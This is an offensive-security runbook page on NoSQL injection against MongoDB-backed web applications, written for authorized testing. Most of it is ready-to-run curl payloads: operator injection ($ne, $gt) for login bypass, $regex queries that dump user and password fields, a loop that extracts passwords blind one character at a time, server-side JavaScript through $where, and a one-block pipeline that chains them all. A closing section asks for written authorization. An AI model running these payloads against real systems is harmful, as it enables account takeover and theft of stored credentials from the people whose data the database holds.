---
title: "NoSQL Injection"
description: "Inject MongoDB operators for auth bypass and blind data extraction, including JavaScript execution in $where."
phase: Web
order: 51
tags:
  - nosql
  - mongodb
  - injection
  - auth
tools:
  - nosqli
  - curl
  - jq
  - mongosh
updated: 2026-10-01
---

A runbook for **NoSQL injection** in an authorized scope. Goal: bypass authentication with operator injection and, if needed, extract data blind — including `$where` JavaScript execution.

## 1. Find the query shape

Look for JSON bodies, query params, and forms feeding a document lookup. Injection works when a string input becomes an object or operators are not stripped.

```bash
curl -s -o /dev/null -w '%{http_code}\n' https://target/api/login \
  -H 'Content-Type: application/json' --data '{"username":"admin","password":"x"}'
```

## 2. Authentication bypass

Force the login comparison to always succeed.

```bash
curl -s -o /dev/null -w '%{http_code}\n' https://target/api/login \
  -H 'Content-Type: application/json' \
  --data '{"username":{"$ne":null},"password":{"$ne":null}}'
curl -s -o /dev/null -w '%{http_code}\n' https://target/api/login \
  -H 'Content-Type: application/json' --data '{"username":"admin","password":{"$gt":""}}'
# Query string form
curl -s -o /dev/null -w '%{http_code}\n' 'https://target/login?username[$ne]=x&password[$ne]=x'
```

## 3. Automated scanning

Run `nosqli` across a captured request to iterate operator payloads quickly.

```bash
nosqli scan -t https://target/api/login -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"*","password":"*"}'
```

## 4. Operator injection for data access

Beyond auth, operators can widen, filter, or project records you should not see.

```bash
curl -s 'https://target/api/users?search[$regex]=.*' -H 'Authorization: Bearer <token>' | jq
curl -s 'https://target/api/users?search[$gt]=' -H 'Authorization: Bearer <token>' | jq
curl -s 'https://target/api/users?field=password&search[$ne]=x' -H 'Authorization: Bearer <token>' | jq
```

## 5. Blind regex extraction

When there is no direct output, use regex and boolean operators and compare responses.

```bash
for c in a b c d e f g 0 1 2 3; do
  n=$(curl -s 'https://target/api/login' -H 'Content-Type: application/json' \
      --data "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$c\"}}" | jq -r 'if .success then "HIT" else "-" end' 2>/dev/null)
  echo "$c -> $n"
done
```

## 6. `$where` JavaScript execution

If user input reaches `$where`, you may run server-side JavaScript. Prefer read-only probes and a deliberate time delay to confirm.

```bash
curl -s 'https://target/api/users' -H 'Content-Type: application/json' \
  --data '{"$where":"sleep(5000) || true"}'
curl -s 'https://target/api/users' -H 'Content-Type: application/json' \
  --data '{"$where":"this.password.match(/^a/)"}'
```

## 7. Inspect the data model with mongosh

If you have an authorized Mongo endpoint, confirm operators and available fields directly.

```bash
mongosh 'mongodb://user:pass@target:27017/app' --quiet --eval 'db.users.findOne()'
mongosh 'mongodb://user:pass@target:27017/app' --quiet --eval 'db.users.find({},{username:1,role:1}).limit(5).toArray()'
```

## 8. Full pipeline (one block)

```bash
TARGET=https://target
# JSON auth bypass
curl -s -o /dev/null -w 'ne  %{http_code}\n' "$TARGET/api/login" -H 'Content-Type: application/json' --data '{"username":{"$ne":null},"password":{"$ne":null}}'
curl -s -o /dev/null -w 'gt  %{http_code}\n' "$TARGET/api/login" -H 'Content-Type: application/json' --data '{"username":"admin","password":{"$gt":""}}'
# query-string bypass
curl -s -o /dev/null -w 'qs  %{http_code}\n' "$TARGET/login?username[\$ne]=x&password[\$ne]=x"
# automated + data access
nosqli scan -t "$TARGET/api/login" -X POST -H 'Content-Type: application/json' -d '{"username":"*","password":"*"}'
curl -s "$TARGET/api/users?search[\$regex]=.*" -H 'Authorization: Bearer <token>' | jq
# blind regex
for c in a b c d e f; do
  curl -s "$TARGET/api/login" -H 'Content-Type: application/json' --data "{\"username\":\"admin\",\"password\":{\"\$regex\":\"^$c\"}}"; echo " <- $c"
done
# $where timing
curl -s -o /dev/null -w '$where time: %{time_total}\n' "$TARGET/api/users" -H 'Content-Type: application/json' --data '{"$where":"sleep(3000) || true"}'
# model inspection
mongosh 'mongodb://user:pass@target:27017/app' --quiet --eval 'db.users.findOne()'
```

## Ethics & legality

- Only test databases in an official scope or with written authorization.
- Avoid destructive writes and heavy `$where` loops; keep DoS probes minimal.
- Confirm findings with the smallest possible read and document the operator used.
